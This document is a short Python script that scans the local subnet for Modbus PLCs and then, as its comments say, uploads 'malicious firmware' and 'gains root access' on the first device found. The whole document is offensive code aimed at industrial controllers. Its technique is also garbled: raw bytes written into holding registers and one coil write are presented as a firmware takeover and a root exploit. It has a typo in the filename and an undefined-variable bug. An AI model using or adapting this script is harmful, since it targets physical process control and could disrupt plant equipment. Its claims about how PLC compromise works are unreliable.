from pymodbus.client.sync import ModbusTcpClient
import socket

# Function to find the PLC's IP address
def find_plc_ip():
    ip_address = socket.gethostbyname(socket.gethostname())
    subnet = '.'.join(ip_address.split('.')[:3]) + '.'
    for i in range(1, 255):
        try:
            client = ModbusTcpClient(subnet + str(i))
            connection = client.connect()
            if connection:
                print(f"Found PLC at IP address: {subnet + str(i)}")
                return subnet + str(i)
        except Exception as e:
            pass
    return None

# Function to upload malicious firmware
def upload_malicious_firmware(client, firmware_file):
    try:
        # Read the current firmware version from the PLC
        firmware_version = client.read_holding_registers(0x1000, 1)
        firmware_version = firmware_version.registers[0]
        print(f"Current firmware version: {firmware_version}")
        
        # Upload the malicious firmware to the PLC
        with open(firmware_file, 'rb') as file:
            firmware_data = file.read()
        client.write_registers(0x1000, list(firmware_data))
        print("Malicious firmware uploaded")
    except Exception as e:
        print(f"Failed to upload malicious firmware: {e}")

# Function to gain root access to the device
def gain_root_access(client):
    try:
        # Use the malicious firmware to gain root access to the device
        client.write_coil(0x0001, 1)
        print("Root access gained")
    except Exception as e:
        print(f"Failed to gain root access: {e}")

# Main function
def main():
    plc_ip_address = find_plc_ip()
    if plc_ip_address:
        client = ModbusTcpClient(plc_ip_address)
        connection = client.connect()
        print(f"Connected to PLC: {connection}")
        
        # Upload malicious firmware
        firmware_file = 'alicious_firmware.bin'
        upload_malicious_firmware(client, firmware_file)
        
        # Gain root access to the device
        gain_root_access(client)
    else:
        print("Failed to find PLC's IP address")
    client.close()

if __name__ == "__main__":
    main()